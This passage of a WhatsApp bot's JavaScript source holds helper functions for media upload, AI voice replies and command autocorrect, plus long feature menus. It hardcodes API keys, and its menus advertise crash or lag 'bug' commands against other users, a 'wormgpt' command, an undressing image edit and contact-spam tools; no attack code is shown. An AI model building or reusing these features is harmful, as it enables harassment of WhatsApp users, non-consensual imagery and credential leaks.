        'audio/mpeg': 'mp3',
        'audio/mp4': 'm4a',
        'audio/ogg': 'ogg',
        'audio/aac': 'aac',
        'audio/wav': 'wav',
        'audio/webm': 'weba',
        'audio/x-wav': 'wav',
        
        // Documents
        'application/pdf': 'pdf',
        'application/msword': 'doc',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'docx',
        'application/vnd.ms-excel': 'xls',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': 'xlsx',
        'application/vnd.ms-powerpoint': 'ppt',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': 'pptx',
        'text/plain': 'txt',
        'text/html': 'html',
        'text/css': 'css',
        'text/javascript': 'js',
        'application/json': 'json',
        'application/xml': 'xml',
        
        // Archives
        'application/zip': 'zip',
        'application/x-rar-compressed': 'rar',
        'application/x-7z-compressed': '7z',
        'application/x-tar': 'tar',
        'application/gzip': 'gz',
        
        // Others
        'application/octet-stream': 'bin'
    };
    
    return mimeExtensions[mime] || '';
}

// ==================== CASE HANDLER ====================
async function uploadGist({ filename, content, description = "Uploaded via WhatsApp Bot" }) {
  const res = await axios.post(
    "https://api.github.com/gists",
    {
      description,
      public: true,
      files: {
        [filename]: {
          content
        }
      }
    },
    {
      headers: {
        Authorization: `token ${global.github.token}`,
        "User-Agent": global.github.username
      }
    }
  )

  return res.data.html_url
}
//
async function upscaler(path){
  try{
    const img = fs.readFileSync(path).toString('base64')
    const create = await axios.post('https://aienhancer.ai/api/v1/r/image-enhance/create',
    {
    model: 3,
    image: `data:image/jpeg;base64,${img}`,
    settings: 'kRpBbpnRCD2nL2RxnnuoMo7MBc0zHndTDkWMl9aW+Gw='
   },
      {
 headers:{
 'User-Agent':'Mozilla/5.0 (Linux; Android 10)',
 'Content-Type':'application/json',
 origin:'https://aienhancer.ai',
 referer:'https://aienhancer.ai/ai-image-upscaler'
   }
  }
 )

    const id = create.data.data.id

    const result = await axios.post('https://aienhancer.ai/api/v1/r/image-enhance/result',
      { task_id: id },
      {
       headers:{
    'User-Agent':'Mozilla/5.0 (Linux; Android 10)',
    'Content-Type':'application/json',
    origin:'https://aienhancer.ai',
    referer:'https://aienhancer.ai/ai-image-upscaler'
   }
  }
 )
    return {
      id,
      output: result.data.data.output,
      input: result.data.data.input
    }

  }catch(e){
    return { status:'engror', msg: e.message }
  }
}
//

async function waitEnhance(url, maxTry = 10) {
  for (let i = 0; i < maxTry; i++) {
    let { data } = await axios.get(
      'https://Vynaa-apis.vercel.app/api/hd',
      { params: { url }, timeout: 60000 }
    )

    if (data?.output) {
      return data.output
    }

    await new Promise(r => setTimeout(r, 3000)) // tunggu 3 detik
  }

  return null
}
//

const mediaPath = path.join(__dirname, './media.json')

function loadMedia() {
  return JSON.parse(fs.readFileSync(mediaPath))
}

function saveMedia(data) {
  fs.writeFileSync(mediaPath, JSON.stringify(data, null, 2))
}
//

async function autoAIVN(m, sock, isCmd) {
  try {
    // âŒ Abaikan command & pesan bot
    if (isCmd) return;
    if (!m.text) return;
    if (m.key.fromMe) return;

    const userText = m.text;

    // ===============================
    // 1ï¸âƒ£ REQUEST KE AI (Gemini)
    // ===============================
    const aiUrl = `${global.api.base}/api/ai?q=${encodeURIComponent(userText)}&prompt=${encodeURIComponent(prompt)}`;
    const aiRes = await axios.get(aiUrl);

    if (!aiRes.data || !aiRes.data.status) return;

    const message = aiRes.data.response;
    if (!message) return;

    // ===============================
    // 2ï¸âƒ£ TEXT â†’ VOICE (ElevenLabs)
    // ===============================
    const audioUrl =
      `${global.api.base}/api/elevenlabs` +
      `?text=${encodeURIComponent(message)}` +
      `&voice=${model}` +
      `&pitch=0&speed=0.9` +
      `&key=${global.api.key}`;

    // ===============================
    // 3ï¸âƒ£ KIRIM VN
    // ===============================
    await sock.sendMessage(
      m.chat,
      {
        audio: { url: audioUrl },
        mimetype: "audio/mpeg",
        ptt: true
      },
      { quoted: fakeQuoted }
    );

  } catch (err) {
    console.error("AutoAI VN Error:", err);
  }
}
if (db.chats[m.chat].autoAi && !m.key.fromMe && !isCmd) {
  await autoAIVN(m, sock, isCmd);
}
//
async function vocalremove(file){
    try{
        if(!fs.existsSync(file)) throw new Error('file not found')

        const form = new FormData()
        form.append('fileName', fs.createReadStream(file))

        return await axios.post(
            'https://aivocalremover.com/api/v2/FileUpload',
            form,
            { headers:{ ...form.getHeaders(), 'User-Agent':'Mozilla/5.0 (Linux; Android 10)' } }
        ).then(async function(r){

            if(!r?.data?.file_name) throw new Error('upload failed')

            const body = new URLSearchParams({
                file_name: r.data.file_name,
                action: 'watermark_video',
                key: 'X9QXlU9PaCqGWpnP1Q4IzgXoKinMsKvMuMn3RYXnKHFqju8VfScRmLnIGQsJBnbZFdcKyzeCDOcnJ3StBmtT9nDEXJn',
                web: 'web'
            })

            return await axios.post(
                'https://aivocalremover.com/api/v2/ProcessFile',
                body,
                {
                    headers:{
                        'User-Agent':'Mozilla/5.0 (Linux; Android 10)',
                        'Content-Type':'application/x-www-form-urlencoded',
                        origin:'https://aivocalremover.com',
                        referer:'https://aivocalremover.com/'
                    }
                }
            ).then(function(x){
                if(!x?.data?.instrumental_path) throw new Error('proses failed')

                return{
                    instrumental: x.data.instrumental_path || null,
                    vocal: x.data.vocal_path || null
                }
            })
        })

    }catch(e){
        return { status:'error', msg:e.message }
    }
}
//
global.depositData = global.depositData || {}
const CI_APIKEY = "sk-5spflyvf52b08f"
const CI_BASE = "https://ciaatopup.my.id/api/h2h/deposit"
//
async function edit2(tex1, tex2) {
          var nln = [
            `${tex1}`,
            `${tex2}`
          ]
          let {
            key
          } = await sock.sendMessage(from, {
            text: 'Loading...'
          }, {
            quoted: m
          })
          let duh = randomNomor(800, 1000)
          for (let i = 0; i < nln.length; i++) {
            await sleep(duh)
            await sock.sendMessage(from, {
              text: nln[i],
              edit: key
            }, {
              quoted: m
            });
          }
        }

        async function edit3(tex1, tex2, tex3) {
          var nln = [
            `${tex1}`,
            `${tex2}`,
            `${tex3}`
          ]
          let {
            key
          } = await sock.sendMessage(from, {
            text: 'Loading...'
          }, {
            quoted: m
          })
          let duh = randomNomor(800, 1000)
          for (let i = 0; i < nln.length; i++) {
            await sleep(duh)
            await sock.sendMessage(from, {
              text: nln[i],
              edit: key
            }, {
              quoted: m
            });
          }
        }

        async function edit5(tex1, tex2, tex3, tex4, tex5) {
          var nln = [
            `${tex1}`,
            `${tex2}`,
            `${tex3}`,
            `${tex4}`,
            `${tex5}`
          ]
          let {
            key
          } = await sock.sendMessage(from, {
            text: 'Loading...'
          }, {
            quoted: m
          })
          let duh = randomNomor(900, 1500)
          for (let i = 0; i < nln.length; i++) {
            await sleep(duh)
            await sock.sendMessage(from, {
              text: nln[i],
              edit: key
            }, {
              quoted: m
            });
          }
        }
       //
       // =========================
// AUTO HITUNG TOTAL CHAT
// =========================
if (m.isGroup) {
  if (!global.db.chats[m.chat]) global.db.chats[m.chat] = {}
  if (!global.db.chats[m.chat].totalchat) global.db.chats[m.chat].totalchat = {}

  const jid = m.sender
  if (!global.db.chats[m.chat].totalchat[jid]) {
    global.db.chats[m.chat].totalchat[jid] = 0
  }

  global.db.chats[m.chat].totalchat[jid] += 1
}
//
setInterval(async () => {
  let sewa = loadSewa()
  let now = Date.now()

  for (let gid in sewa) {
    if (now > sewa[gid].expired) {
      await sock.groupLeave(gid)
      delete sewa[gid]
      saveSewa(sewa)
      console.log("Sewa habis, keluar grup:", gid)
    }
  }
}, 60 * 1000) // cek tiap 1 menit
//
const hsh = "Ketik .listmenu untuk melihat semua kategori menu"
function sendMenu(type) {
    const setmenu = loadSetMenu()
    const menuVersion = setmenu.menuVersion || 'v1'

    const menus = {
        v1: menuV1,
        v2: menuV2,
        v3: menuV3,
        v4: menuV4
    }

    const send = menus[menuVersion] || menuV1
    send(type)
}
//
function countTelegramMsg(mainFile = './main.js') {
  if (!fs.existsSync(mainFile)) return 0

  const content = fs.readFileSync(mainFile, 'utf-8')

  // Hitung semua pemanggilan kirim pesan Telegram
  const patterns = [
    /bot\.sendMessage\s*\(/g,
    /bot\.sendPhoto\s*\(/g,
    /bot\.sendVideo\s*\(/g,
    /bot\.sendAudio\s*\(/g,
    /bot\.sendSticker\s*\(/g,
    /bot\.sendMediaGroup\s*\(/g,
    /bot\.editMessageMedia\s*\(/g
  ]

  let total = 0
  for (const regex of patterns) {
    const match = content.match(regex)
    if (match) total += match.length
  }

  return total
}
//

// ambil semua case dari file case.js
function getCommandList(filePath) {
  const data = fs.readFileSync(filePath, 'utf8')

  const regex = /case\s+['"`]([^'"`]+)['"`]\s*:/g
  const commands = []
  let match

  while ((match = regex.exec(data)) !== null) {
    commands.push(match[1])
  }

  return [...new Set(commands)] // hapus duplikat
}

function levenshtein(a, b) {
  if (!a || !b) return Math.max(a.length, b.length)
  const matrix = []

  for (let i = 0; i <= b.length; i++) matrix[i] = [i]
  for (let j = 0; j <= a.length; j++) matrix[0][j] = j

  for (let i = 1; i <= b.length; i++) {
    for (let j = 1; j <= a.length; j++) {
      matrix[i][j] = b[i - 1] === a[j - 1]
        ? matrix[i - 1][j - 1]
        : Math.min(
            matrix[i - 1][j - 1] + 1,
            matrix[i][j - 1] + 1,
            matrix[i - 1][j] + 1
          )
    }
  }

  return matrix[b.length][a.length]
}

function similarity(a, b) {
  const distance = levenshtein(a, b)
  return 1 - distance / Math.max(a.length, b.length)
}

function autoCorrect(input, commandList) {
  let best = null
  let scoreMax = 0

  for (const cmd of commandList) {
    const score = similarity(input, cmd)
    if (score > scoreMax) {
      scoreMax = score
      best = cmd
    }
  }

  return scoreMax >= 0.6 ? best : null
}
const caseFile = './Vynaa.js'

// ambil command dari case.js
const commandList = getCommandList(caseFile)

const inputCmd = command.replace(prefix, '')

// jika command tidak ada
// jika command tidak ada
if (!commandList.includes(inputCmd)) {
  // cek fitur autocorrect
  if (!setting.autocorrect) return

  const suggest = autoCorrect(inputCmd, commandList)

  if (suggest) {
    return sock.sendMessage(m.chat, {
      text: `âŒ Command *${prefix}${inputCmd}* tidak ditemukan\n\nMungkin maksud kamu *${prefix}${suggest}*`,
      footer: 'Auto Correct Command',
      buttons: [
        {
          buttonId: `${prefix}${suggest}`,
          buttonText: { displayText: `âœ… Pakai ${prefix}${suggest}` },
          type: 1
        }
      ],
      headerType: 1
    }, { quoted: m })
  }
}
//
//
const emot1 = "â•”â•â•â•â‰«"
const emot2 = "â•‘âœ¾ "
const emot3 = "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[]"
// OWNER
const menuowner = `
${emot1}ï¸ MENU - OWNER
${emot2}.joingc
${emot2}.addowner
${emot2}.delowner
${emot2}.listowner
${emot2}.addprem
${emot2}.delprem
${emot2}.listprem
${emot2}.setbotpp
${emot2}.setbotname
${emot2}.setbotbio
${emot2}.autoread
${emot2}.autotyping
${emot2}.autobio
${emot2}.onlygc
${emot2}.onlypc
${emot2}.onlyadmin
${emot2}.addcase
${emot2}.delcase
${emot2}.listcase
${emot2}.getcase
${emot2}.self/public
${emot2}.creategc
${emot2}.backupsc
${emot2}.sendchat
${emot2}.rvo
${emot2}.addlimit
${emot2}.addsewa
${emot2}.listsewa
${emot2}.setmenu
${emot2}.ban
${emot2}.unban
${emot2}.setautobeckup
${emot2}.playch
${emot2}.listdbuser
${emot2}.autolimit
${emot2}.deploy
${emot2}.warn
${emot2}.delwarn
${emot2}.listgc
${emot2}.setimagemenu
${emot2}.setthumbnailmenu
${emot2}.setvideomenu
${emot2}.setaudiomenu
${emot2}.sholat
${emot2}.kickall
${emot3}
`
const menugroup = `
${emot1}ï¸ MENU - GROUP
${emot2}.open/close
${emot2}.promote/demote
${emot2}.antilinkall
${emot2}.antilinkgc
${emot2}.antilinkch
${emot2}.antilinkig
${emot2}.antiwame
${emot2}.antijudol
${emot2}.kick
${emot2}.linkgc
${emot2}.resetlinkgc
${emot2}.totag
${emot2}.hidetag
${emot2}.tagall
${emot2}.setppgc
${emot2}.delppgc
${emot2}.addbadwords
${emot2}.delbadwords
${emot2}.list
${emot2}.addlist
${emot2}.dellist
${emot2}.updatelist
${emot2}.welcome
${emot2}.goodbye
${emot2}.setwelcome
${emot2}.setgoodbye
${emot2}.setwelcomeimage
${emot2}.setgoodbyeimage
${emot2}.welcomestatus
${emot2}.antitagsw
${emot2}.antivideo
${emot2}.absen
${emot2}.listabsen
${emot2}.accall
${emot2}.rejectall
${emot2}.add
${emot2}.antifoto
${emot2}.mutegc
${emot2}.setnamegc
${emot2}.setdescgc
${emot2}.toswgc
${emot2}.antispam
${emot2}.antiaudio
${emot2}.antistiker
${emot2}.antidokumen
${emot2}.anticall
${emot2}.autoaivn
${emot3}
`

const menuother = `
${emot1}ï¸ MENU - OTHER
${emot2}.bfstock
${emot2}.sound1 - sound250
${emot2}.sad1 - sad55
${emot2}.music1 - music65
${emot2}.mangkane1 - mangkane54
${emot2}.removebg
${emot2}.pastebin
${emot2}.getpp
${emot2}.iqc
${emot2}.brat
${emot2}.bratvid
${emot2}.remini
${emot2}.smeme
${emot2}.toimage
${emot2}.tovn
${emot2}.toaudio
${emot2}.tourl
${emot2}.tourl2
${emot2}.tourlgh
${emot2}.stiker
${emot2}.cek
${emot2}.ping
${emot2}.owner
${emot2}.afk
${emot2}.getpb
${emot2}.owner
${emot2}.qc
${emot2}.vn
${emot2}.hdvid
${emot2}.limit
${emot2}.claim
${emot2}.daily
${emot2}.tomedia
${emot2}.toprompt
${emot2}.register
${emot2}.unregister
${emot2}.gaginfo
${emot2}.lyrics
${emot2}.pendek
${emot2}.esm2cjs
${emot2}.readmore
${emot2}.cekidch
${emot2}.luma
${emot2}.elevenlabs
${emot2}.react
${emot2}.removewm 
${emot2}.ssweb
${emot2}.tgsticker
${emot2}.get
${emot2}.cuaca
${emot2}.buysc
${emot2}.upgh
${emot2}.tourlgh
${emot2}.ceksim
${emot2}.upscale
${emot2}.togif
${emot2}.bratgura
${emot3}
`
const menuai = `
${emot1}ï¸ MENU - AI
${emot2}.Vynaa
${emot2}.Vynaaai
${emot2}.autoai
${emot2}.ai
${emot2}.gpt
${emot2}.openai
${emot2}.ocr
${emot2}.copilot
${emot2}.felo
${emot2}.islamai
${emot2}.aiimage
${emot2}.aivideo
${emot2}.perplexity
${emot2}.copilot-think 
${emot2}.txt2music
${emot2}.veo3
${emot2}.shion
${emot2}.wormgpt
${emot2}.sora2
${emot2}.theresa
${emot2}.castorice
${emot2}.deepseek
${emot2}.asistenai
${emot2}.chateverywhere
${emot2}.turbochat
${emot2}.writecream
${emot2}.heckai
${emot2}.claude
${emot2}.zahanat
${emot2}.overchat
${emot2}.sandbox
${emot3}
`

const menudownload = `
${emot1}ï¸ MENU - DOWNLOAD
${emot2}.SnackVideo
${emot2}.tiktok
${emot2}.ytmp4
${emot2}.ytmp3
${emot2}.tiktoksearch
${emot2}.ytsearch
${emot2}.tiktokaudio
${emot2}.douyin
${emot2}.capcut
${emot2}.threads
${emot2}.instagram
${emot2}.facebook
${emot2}.kuaishou
${emot2}.qq
${emot2}.espn
${emot2}.pinterest
${emot2}.imdb
${emot2}.imgur
${emot2}.ifunny
${emot2}.izlesene
${emot2}.reddit
${emot2}.youtube
${emot2}.twitter
${emot2}.vimeo
${emot2}.snapchat
${emot2}.bilibili
${emot2}.dailymotion
${emot2}.sharechat
${emot2}.likee
${emot2}.linkedin
${emot2}.tumblr
${emot2}.hipi
${emot2}.telegram
${emot2}.getstickerpack
${emot2}.bitchute
${emot2}.febspot
${emot2}.9gag
${emot2}.oke.ru
${emot2}.rumble
${emot2}.streamable
${emot2}.ted
${emot2}.sohutv
${emot2}.pornbox
${emot2}.xvideos
${emot2}.xnxx
${emot2}.kuaishou
${emot2}.xiaohongshu
${emot2}.ixigua
${emot2}.weibo
${emot2}.miaopai
${emot2}.meipai
${emot2}.xiaoying
${emot2}.national video
${emot2}.yingke
${emot2}.sina
${emot2}.bluesky
${emot2}.soundcloud
${emot2}.mixcloud
${emot2}.spotify
${emot2}.zingmp3
${emot2}.bandcamp
${emot2}.download
${emot2}.mediafire
${emot2}.gdrive
${emot2}.pinalbum
${emot2}.autodownload 
${emot2}.gitclone
${emot3}
`

const menuconvert = `
${emot1}ï¸ MENU - CONVERT
${emot2}.bass
${emot2}.blown
${emot2}.deep
${emot2}.earrrape
${emot2}.fast
${emot2}.fat
${emot2}.nightcore
${emot2}.reverse
${emot2}.robot
${emot2}.slow
${emot2}.smooth
${emot2}.tupai
${emot3}
`
const menucpanel = `
${emot1}ï¸ MENU - CPANEL
${emot2}.1gb
${emot2}.2gb
${emot2}.3gb
${emot2}.4gb
${emot2}.5gb
${emot2}.6gb
${emot2}.7gb
${emot2}.8gb
${emot2}.9gb
${emot2}.10gb
${emot2}.unli
${emot2}.cadmin
${emot2}.deladmin
${emot2}.listadmin
${emot2}.delpanel
${emot2}.listpanel
${emot2}.clearuser
${emot2}.clearserver
${emot2}.clearadmin 
${emot3}
`

const menucpanel2 = `
${emot1}ï¸ MENU - CPANELV2
${emot2}.1gb-V2
${emot2}.2gb-V2
${emot2}.3gb-V2
${emot2}.4gb-V2
${emot2}.5gb-V2
${emot2}.6gb-V2
${emot2}.7gb-V2
${emot2}.8gb-V2
${emot2}.9gb-V2
${emot2}.10gb-V2
${emot2}.unli-V2
${emot2}.cadmin-V2
${emot2}.deladmin-V2
${emot2}.listadmin-V2
${emot2}.delpanel-V2
${emot2}.listpanel-V2
${emot2}.clearuser-V2
${emot2}.clearserver-V2
${emot2}.clearadmin-V2
${emot3}
`

const menufun = `
${emot1}ï¸ MENU - FUN
${emot2}.apakah
${emot2}.bisakah
${emot2}.kapankah
${emot2}.bagaimanakah
${emot2}.cekganteng
${emot2}.cekcantik
${emot2}.cekgay
${emot2}.ceklesbi
${emot2}.ceksifat
${emot2}.cekhoby
${emot2}.cekjodoh
${emot2}.cekkhodam
${emot2}.jadian
${emot2}.terima
${emot2}.tolak
${emot2}.putus
${emot2}.cekpasangan
${emot2}.wangy
${emot2}.rate
${emot2}.top
${emot2}.bego
${emot2}.goblok
${emot2}.janda
${emot2}.perawan
${emot2}.babi
${emot2}.tolol
${emot2}.pekok
${emot2}.jancok
${emot2}.pinter
${emot2}.pintar
${emot2}.asu
${emot2}.bodoh
${emot2}.gay
${emot2}.lesby
${emot2}.bajingan
${emot2}.jancok
${emot2}.anjing
${emot2}.anjg
${emot2}.anjj
${emot2}.anj
${emot2}.ngentod
${emot2}.ngentot
${emot2}.monyet
${emot2}.mastah
${emot2}.newbie
${emot2}.bangsat
${emot2}.bangke
${emot2}.sange
${emot2}.sangean
${emot2}.dakjal
${emot2}.horny
${emot2}.wibu
${emot2}.puki
${emot2}.puqi
${emot2}.peak
${emot2}.pantex
${emot2}.pantek
${emot2}.setan
${emot2}.iblis
${emot2}.cacat
${emot2}.yatim
${emot2}.piatu
${emot3}
`

const menuanime = `
${emot1}ï¸ MENU - ANIME
${emot2}.akiyama
${emot2}.ana
${emot2}.art
${emot2}.asuna
${emot2}.ayuzawa
${emot2}.boruto
${emot2}.bts
${emot2}.cartoon
${emot2}.chiho
${emot2}.chitoge
${emot2}.cosplay
${emot2}.cosplayloli
${emot2}.cosplaysagiri
${emot2}.cyber
${emot2}.deidara
${emot2}.doraemon
${emot2}.elaina
${emot2}.emilia
${emot2}.erza
${emot2}.exo
${emot2}.gamewallpaper
${emot2}.gremory
${emot2}.hacker
${emot2}.hestia
${emot2}.hinata
${emot2}.husbu
${emot2}.inori
${emot2}.islamic
${emot2}.isuzu
${emot2}.itachi
${emot2}.itori
${emot2}.jennie
${emot2}.jiso
${emot2}.justina
${emot2}.kaga
${emot2}.kagura
${emot2}.kakasih
${emot2}.kaori
${emot2}.keneki
${emot2}.kotori
${emot2}.kurumi
${emot2}.lisa
${emot2}.madara
${emot2}.megumin
${emot2}.mikasa
${emot2}.mikey
${emot2}.miku
${emot2}.minato
${emot2}.mountain
${emot2}.naruto
${emot2}.neko2
${emot2}.nekonime
${emot2}.nezuko
${emot2}.onepiece
${emot2}.pentol
${emot2}.pokemon
${emot2}.programming
${emot2}.randomnime
${emot2}.randomnime2
${emot2}.rize
${emot2}.rose
${emot2}.sagiri
${emot2}.sakura
${emot2}.sasuke
${emot2}.satanic
${emot2}.shina
${emot2}.shinka
${emot2}.shinomiya
${emot2}.shizuka
${emot2}.shota
${emot2}.shortquote
${emot2}.space
${emot2}.technology
${emot2}.tejina
${emot2}.toukachan
${emot2}.tsunade
${emot2}.yotsuba
${emot2}.yuki
${emot2}.yulibocil
${emot2}.yumeko
${emot3}
`

const menugame = `
${emot1}ï¸ MENU - GAME
${emot2}.tebakkta
${emot2}.tebakgambar
${emot2}.tebakbendera
${emot2}.tebakkimia
${emot2}.asahotak
${emot2}.susunkata
${emot2}.family100
${emot2}.tebaktebakan
${emot2}.tekateki 
${emot3}
`

const menuprimbon = `
${emot1}ï¸ MENU - PRIMBON
${emot2}.artinama
${emot2}.artimimpi
${emot2}.ramaljodoh
${emot2}.ramaljodohbali
${emot2}.ramalcinta
${emot2}.cocoknama
${emot2}.pasangan
${emot2}.suamiistri
${emot2}.jadiannikah
${emot2}.sifatusaha
${emot2}.rezeki
${emot2}.pekerjaan
${emot2}.nasib
${emot2}.penyakit
${emot2}.tarot
${emot2}.fengshui
${emot2}.haribaik
${emot2}.harisangar
${emot2}.harisial
${emot2}.nagahari
${emot2}.arahrezeki
${emot2}.peruntungan
${emot2}.weton
${emot2}.karakter
${emot2}.keberuntungan
${emot2}.memancing
${emot2}.masabubur
${emot2}.zodiak
${emot2}.shio
${emot3}
`

const menumaker = `
${emot1}ï¸ MENU - MAKER
${emot2}.gura
${emot2}.carbonify
${emot2}.txt2img
${emot2}.img2img
${emot2}.animegirl
${emot2}.attp
${emot2}.fakestory
${emot2}.faketweet
${emot2}.ttp
${emot3}
`

const menurpg = `
${emot1}ï¸ MENU - RPG
${emot2}.adventure
${emot2}.beli
${emot2}.bank
${emot2}.shop
${emot2}.berburu
${emot2}.crafting
${emot2}.heal
${emot2}.nyampah
${emot2}.inventory
${emot2}.dailymisi
${emot2}.weekly
${emot2}.monthly
${emot2}.yearly
${emot2}.ngojek
${emot2}.polisi
${emot2}.roket
${emot2}.wikwik
${emot2}.ewe-paksa
${emot2}.open-bo
${emot2}.selectskill
${emot2}.cekskill
${emot2}.makan
${emot2}.tidur
${emot2}.mengaji
${emot2}.transfer
${emot2}.joinrpg
${emot2}.exitrpg
${emot2}.jual
${emot2}.kerja
${emot2}.redeem
${emot2}.memancing
${emot2}.merampok
${emot2}.mining
${emot2}.nebang
${emot2}.repair
${emot2}.atmall
${emot2}.dompet
${emot2}.werewolf
${emot3}
`

const menueditimg = `
${emot1}ï¸ MENU - EDITIMG
${emot2}.putihkan
${emot2}.hitamkan
${emot2}.edit
${emot2}.tobersama
${emot2}.toblonde
${emot2}.tobotak
${emot2}.tohijab
${emot2}.tomekah
${emot2}.tomirror
${emot2}.tovintage
${emot2}.toanime
${emot2}.tofigura
${emot2}.tovigurav2
${emot2}.tofigurav3
${emot2}.tobabi
${emot2}.tobrewok
${emot2}.tochibi
${emot2}.todpr
${emot2}.toghibli
${emot2}.tojepang
${emot2}.tokacamata
${emot2}.tolego
${emot2}.tomaya
${emot2}.tomoai
${emot2}.toreal
${emot2}.tosdmtinggi
${emot2}.tosatan
${emot2}.tosad
${emot2}.tosexy
${emot2}.tobugil
${emot2}.tokamboja
${emot2}.todubai
${emot2}.toliquor
${emot2}.tomaid
${emot2}.tomangu
${emot2}.topeci
${emot2}.topiramida
${emot2}.topolaroid
${emot2}.topunk
${emot2}.toroh
${emot2}.tostreetwear
${emot2}.totato
${emot2}.totrain
${emot2}.totua
${emot2}.toturky
${emot3}
`
const menuephoto = `
${emot1}ï¸ MENU - EPHOTO
${emot2}.glitchtext
${emot2}.writetext
${emot2}.advancedglow
${emot2}.typographytext
${emot2}.pixelglitch
${emot2}.neonglitch
${emot2}.flagtext
${emot2}.flag3dtext
${emot2}.deletingtext
${emot2}.blackpinkstyle
${emot2}.glowingtext
${emot2}.underwatertext
${emot2}.logomaker
${emot2}.cartoonstyle
${emot2}.papercutstyle
${emot2}.watercolortext
${emot2}.effectclouds
${emot2}.blackpinklogo
${emot2}.gradienttext
${emot2}.summerbeach
${emot2}.luxurygold
${emot2}.multicoloyellowneon
${emot2}.sandsummer
${emot2}.galaxywallpaper
${emot2}.1917style
${emot2}.makingneon
${emot2}.royaltext
${emot2}.freecreate
${emot2}.galaxystyle
${emot2}.lighteffects
${emot3}
`

const menustore = `
${emot1}ï¸ MENU - STORE
${emot2}.jpm
${emot2}.pushkontak
${emot2}.savekontak
${emot2}.done
${emot2}.proses
${emot2}.payment
${emot2}.addproduk
${emot2}.delproduk
${emot2}.listproduk
${emot2}.beliproduk
${emot2}.restok
${emot2}.confirm
${emot2}.cancel
${emot2}.jpmch
${emot2}.addidch
${emot3}
`
const menuquotes = `
${emot1}ï¸ MENU - QUOTES
${emot2}.faktaunik
${emot2}.katailham
${emot2}.katasenja
${emot2}.motivasi
${emot2}.pantun
${emot2}.puisi
${emot2}.quotes
${emot2}.quotesanime
${emot2}.quotesbucin
${emot2}.quotesdilan
${emot2}.quotesislamic
${emot3}
`
const menuconfess = `
${emot1}ï¸ MENU - MENFESS
${emot2}.menfess
${emot2}.confess
${emot3}
`
const menurandom = `
${emot1}ï¸ MENU - RANDOM
${emot2}.bluearchiver
${emot2}.china
${emot2}.indo
${emot2}.waifu
${emot2}.neko
${emot2}.vietnam
${emot2}.thailand
${emot2}.korea
${emot2}.japan
${emot3}
`
const menuberita = `
${emot1}ï¸ MENU - BERITA
${emot2}.antara
${emot2}.cnbc
${emot2}.cnn
${emot2}.kompas
${emot2}.merdeka
${emot2}.sindonews
${emot2}.suara
${emot3}
`
const menuppob = `
${emot1}ï¸ MENU - PPOB
${emot2}.deposit
${emot2}.bank
${emot2}.saldo
${emot2}.mutasi
${emot2}.buypanel
${emot2}.order
${emot3}
`
const menulinode = `
${emot1}ï¸ MENU - LINODE
${emot2}.linode2gb
${emot2}.linode4gb
${emot2}.linode8gb
${emot2}.linode16gb
${emot2}.listlinode
${emot2}.onlinode
${emot2}.offlinode
${emot2}.rebootlinode
${emot2}.rebuildlinode
${emot2}.delinode
${emot2}.saldolinode
${emot2}.sisalinode
${emot2}.cekvpslinode
${emot3}
`
const menunsfw = `
${emot1}ï¸ MENU - NSFW
${emot2}.waifu
${emot2}.neko
${emot2}.shinobu
${emot2}.megumin
${emot2}.bully
${emot2}.cuddle
${emot2}.cry
${emot2}.hug
${emot2}.awoo
${emot2}.kiss
${emot2}.lick
${emot2}.pat
${emot2}.smug
${emot2}.bonk
${emot2}.yeet
${emot2}.blush
${emot2}.smile
${emot2}.wave
${emot2}.highfive
${emot2}.handhold
${emot2}.nom
${emot2}.bite
${emot2}.glomp
${emot2}.slap
${emot2}.kill
${emot2}.happy
${emot2}.wink
${emot2}.poke
${emot2}.dance
${emot2}.cringe
${emot2}.trap
${emot2}.blowjob
${emot2}.hentai
${emot2}.boobs
${emot2}.ass
${emot2}.pussy
${emot2}.thighs
${emot2}.lesbian
${emot2}.lewdneko
${emot2}.cum
${emot3}
`
const menugenshin = `
${emot1}ï¸ MENU - GENSHIN
${emot2}.build_gi
${emot2}.gens-wildlife
${emot2}.gens-weapons
${emot2}.gens-voiceovers
${emot2}.gens-viewpoint
${emot2}.gens-talents
${emot2}.gens-potion
${emot2}.gens-outfit
${emot2}.gens-nation
${emot2}.gens-namacard
${emot2}.gens-materials
${emot2}.gens-food
${emot2}.gens-enemy
${emot2}.gens-emoji
${emot2}.gens-domain
${emot2}.gens-craft
${emot2}.gens-constellation
${emot2}.gens-artifact
${emot2}.gens-area
${emot2}.gens-animals
${emot2}.gens-advrank
${emot2}.gens-achievement
${emot2}.gens-characters
${emot3}
`
const menuenc = `
${emot1}ï¸ MENU - ENCRYPT
${emot2}.enccustome
${emot2}.encarab
${emot2}.encchina
${emot2}.encinvis
${emot2}.encsiu
${emot2}.encstrong
${emot2}.encultra
${emot3}
`
const menudigitalocean = `
${emot1}ï¸ MENU - DIGITAL OCEAN
${emot2}.vps1g1c
${emot2}.vps2g1c
${emot2}.vps4g2c
${emot2}.vps8g4c
${emot2}.vps16g4c
${emot2}.listdroplet
${emot2}.deldroplet
${emot2}.sisadroplet
${emot2}.cekdroplet
${emot2}.turnon
${emot2}.turnoff
${emot2}.restartvps
${emot3}
`
const menuislam = `
${emot1}ï¸ MENU - ISLAM
${emot2}.jadwalsholat
${emot2}.alquran
${emot2}.asmaulhusna
${emot2}.niatsholat
${emot2}.surah
${emot2}.berdoa
${emot2}.ayatkursi
${emot2}.gislam
${emot2}.kataislam
${emot2}.pantunislam
${emot3}
`
const menusearch = `
${emot1}ï¸ MENU - SEARCH
${emot2}.playstore
${emot2}.playstation
${emot2}.google
${emot2}.chrome
${emot2}.gimage
${emot2}.bingsearch
${emot2}.bingimage
${emot2}.bingvideo
${emot3}
`
const menubug = `
${emot1}ï¸ MENU - BUG
${emot2}.delay
${emot2}.delayv2
${emot2}.delayv3
${emot2}.delayv4
${emot2}.delayv5
${emot2}.delayv6
${emot2}.delayv7
${emot2}.delayv8
${emot2}.delayv9
${emot2}.delayv10
${emot2}.bugurl
${emot2}.bugs
${emot2}.buglink
${emot2}.spams
${emot2}.santetgc2
${emot2}.santetgc
${emot2}.xvir
${emot2}.xstik
${emot2}.xlist
${emot2}.xbutton
${emot2}.x24j
${emot2}.xuia
${emot2}.xlec
${emot2}.xforce
${emot2}.xva
${emot2}.xta
${emot2}.xcrash
${emot2}.xbom
${emot2}.xbug
${emot2}.xkill
${emot2}.xloc
${emot2}.xdoc
${emot2}.xhit
${emot3}
  `
  const menustalk = `
